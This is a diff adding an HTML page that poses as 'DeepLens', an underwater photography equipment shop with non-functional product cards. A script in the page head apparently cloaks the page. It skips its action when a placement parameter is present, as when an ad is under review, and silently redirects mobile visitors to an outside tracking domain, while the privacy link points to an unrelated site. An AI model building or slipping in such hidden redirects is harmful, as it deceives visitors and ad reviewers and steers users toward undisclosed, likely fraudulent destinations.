@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/2b563712-fe69-4179-9e2f-168dcbbd0547?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") {
+    } else if (isMobileDevice) {
+        window.location.href = lander;
+    } else {
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DeepLens: Premium Underwater Photography Equipment</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto:wght@300;400;700&display=swap');
+        
+        :root {
+            --primary-color: #006994;
+            --secondary-color: #00FFFF;
+            --background-color: #E6F3F7;
+            --text-color: #333333;
+        }
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background: linear-gradient(135deg, var(--primary-color), #004466);
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            flex: 1;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            padding: 40px;
+        }
+        .equipment-card {
+            background-color: #FFFFFF;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 105, 148, 0.1);
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+        }
+        .equipment-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 8px 16px rgba(0, 105, 148, 0.2);
+        }
+        .equipment-image {
+            height: 200px;
+            background-color: #B2E6FF;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            color: var(--primary-color);
+            position: relative;
+            overflow: hidden;
+        }
+        .equipment-image::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle, transparent 30%, #B2E6FF 150%);
+            opacity: 0.7;
+        }
+        .equipment-info {
+            padding: 20px;
+        }
+        h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 3em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        h2 {
+            font-family: 'Montserrat', sans-serif;
+            color: var(--primary-color);
+            margin-top: 0;
+            font-size: 1.5em;
+        }
+        p {
+            color: #555555;
+            line-height: 1.6;
+        }
+        .specs {
+            font-weight: bold;
+            color: var(--primary-color);
+            font-size: 0.9em;
+            margin-top: 15px;
+        }
+        .category {
+            background-color: var(--secondary-color);
+            color: var(--primary-color);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .buy-button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 15px;
+            font-size: 1em;
+            font-weight: bold;
+            font-family: 'Montserrat', sans-serif;
+        }
+        .buy-button:hover {
+            background-color: #00547A;
+            transform: scale(1.05);
+        }
+        footer {
+            background: linear-gradient(135deg, #004466, var(--primary-color));
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: #FFFFFF;
+            padding: 15px 0;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        nav li {
+            margin: 0 20px;
+        }
+        nav a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: color 0.3s ease;
+            font-family: 'Montserrat', sans-serif;
+        }
+        nav a:hover {
+            color: var(--secondary-color);
+        }
+        footer a {
+            color: var(--secondary-color);
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>DeepLens</h1>
+        <p>Capture the Depths with Premium Underwater Photography Equipment</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Cameras</a></li>
+            <li><a href="#">Housings</a></li>
+            <li><a href="#">Lighting</a></li>
+            <li><a href="#">Accessories</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="equipment-card">
+            <div class="equipment-image">Submersible DSLR</div>
+            <div class="equipment-info">
+                <h2>AquaPro X-3000 DSLR</h2>
+                <p>Professional-grade underwater DSLR with 4K video capabilities.</p>
+                <span class="category">Cameras</span>
+                <p class="specs">24MP | 4K/60fps | 100m Depth Rating</p>
+                <button class="buy-button">Add to Cart</button>
+            </div>
+        </div>
+        <div class="equipment-card">
+            <div class="equipment-image">Camera Housing</div>
+            <div class="equipment-info">
+                <h2>DeepShell Armor Housing</h2>
+                <p>Robust housing compatible with most DSLR and mirrorless cameras.</p>
+                <span class="category">Housings</span>
+                <p class="specs">200m Depth Rating | Aluminum Construction</p>
+                <button class="buy-button">Add to Cart</button>
+            </div>
+        </div>
+        <div class="equipment-card">
+            <div class="equipment-image">Underwater Strobe</div>
+            <div class="equipment-info">
+                <h2>LuminaMax 5000 Strobe</h2>
+                <p>Powerful strobe light for vibrant underwater photography.</p>
+                <span class="category">Lighting</span>
+                <p class="specs">5000 Lumens | 100° Beam Angle | TTL Compatible</p>
+                <button class="buy-button">Add to Cart</button>
+            </div>
+        </div>
+        <div class="equipment-card">
+            <div class="equipment-image">Wide-Angle Lens</div>
+            <div class="equipment-info">
+                <h2>AquaVision 14mm Lens</h2>
+                <p>Ultra-wide angle lens for expansive underwater scenes.</p>
+                <span class="category">Accessories</span>
+                <p class="specs">14mm Focal Length | f/2.8 | Multicoated</p>
+                <button class="buy-button">Add to Cart</button>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2024 DeepLens Underwater Photography Equipment. Dive deep, capture brilliance.</p>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
